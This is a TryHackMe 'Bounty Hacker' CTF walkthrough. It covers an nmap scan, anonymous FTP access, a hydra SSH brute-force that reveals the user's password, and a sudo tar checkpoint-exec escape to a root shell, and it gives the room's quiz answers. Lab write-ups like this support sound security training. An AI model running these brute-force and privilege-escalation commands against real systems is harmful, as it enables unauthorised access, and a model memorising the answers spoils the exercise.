<p align="center">
  THM : Bounty Hacker<br>
  Difficulty : Easy<br>
  Room link : https://tryhackme.com/room/cowboyhacker<br>
  <img src="https://i.imgur.com/VnkgDn8.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [FTP enumeration](#ftp-enumeration)
- [SSH bruteforce](#ssh-bruteforce)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

Let's run an agressive [nmap](https://nmap.org/) scan against the target :  
```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-21 17:51 CEST
Nmap scan report for 10.10.198.38
Host is up (0.063s latency).
Not shown: 55529 filtered ports, 10003 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.32.60
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.93 seconds
```

- FTP port is open and anonymous login is allowed (port 21)
- SSH port is open (port 22)
- A webserver is running on the target (port 80)

## FTP enumeration

Let's login to the FTP service as `anonymous` and see what files we can find :  
```
attacker@AttackBox:~/Documents/THM/CTF/Bounty_Hacker$ ftp 10.10.198.38
Connected to 10.10.198.38.
220 (vsFTPd 3.0.3)
Name (10.10.198.38:attacker): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```

Let's get those files on our attacker machine and see what's inside :  
```
attacker@AttackBox:~/Documents/THM/CTF/Bounty_Hacker$ cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
attacker@AttackBox:~/Documents/THM/CTF/Bounty_Hacker$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

We have a possible username `lin`. The file `locks.txt` seems to be a password list.

**Question : Who wrote the task list ?**  
**Answer : lin**  

## SSH bruteforce

Since we have a username `lin` and a password list, we can try to brute force some services on the target. Let's try with `SSH` first using [hydra](https://github.com/vanhauser-thc/thc-hydra) :  
```
attacker@AttackBox:~/Documents/THM/CTF/Bounty_Hacker$ hydra -l lin -P locks.txt 10.10.198.38 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-21 18:04:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.198.38:22/
[22][ssh] host: 10.10.198.38   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-21 18:04:56
```

We successfully brute forced `lin`'s SSH password !

**Question : What service can you bruteforce with the text file found ?**  
**Answer : SSH**  

**Question : What is the users password ?**  
**Answer : RedDr4gonSynd1cat3**  

Now let's login to SSH using the credentials we found :  
```
attacker@AttackBox:~/Documents/THM/CTF/Bounty_Hacker$ ssh lin@10.10.198.38
The authenticity of host '10.10.198.38 (10.10.198.38)' can't be established.
ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.198.38' (ECDSA) to the list of known hosts.
lin@10.10.198.38's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$
```

Let's get the user flag :  
```
lin@bountyhacker:~/Desktop$ ls -la
total 12
drwxr-xr-x  2 lin lin 4096 Jun  7  2020 .
drwxr-xr-x 19 lin lin 4096 Jun  7  2020 ..
-rw-rw-r--  1 lin lin   21 Jun  7  2020 user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
THM{*******************}
```

## Privilege escalation

It's time to escalate our privileges. Let's take a look at our sudo rights :  
```
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

We can run tar as root. We can search for `tar` on [GTFOBins](https://gtfobins.github.io/) :  
![](https://i.imgur.com/AS8xbPU.jpg)  

Let's use this exploit and get a root shell :  
```
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
```

We are root ! Let's get the root flag :  
```
# cd /root
# ls -la
total 40
drwx------  5 root root 4096 Jun  7  2020 .
drwxr-xr-x 24 root root 4096 Jun  6  2020 ..
-rw-------  1 root root 2694 Jun  7  2020 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Feb 26  2019 .cache
drwxr-xr-x  2 root root 4096 Jun  7  2020 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   19 Jun  7  2020 root.txt
-rw-r--r--  1 root root   66 Jun  7  2020 .selected_editor
drwx------  2 root root 4096 Jun  7  2020 .ssh
# cat root.txt
THM{**************}
#
```

## Conclusion

This CTF was very easy and simple. I think it is a very good CTF for very beginners.
We practiced : 
- Ports/Services enumeration using [nmap](https://nmap.org/)
- FTP enumeration using `anonymous` login
- SSH bruteforce using [hydra](https://github.com/vanhauser-thc/thc-hydra)
- Basic linux enumeration
- Basic privilege escalation

Thanks for this room and thanks for reading my write ups !
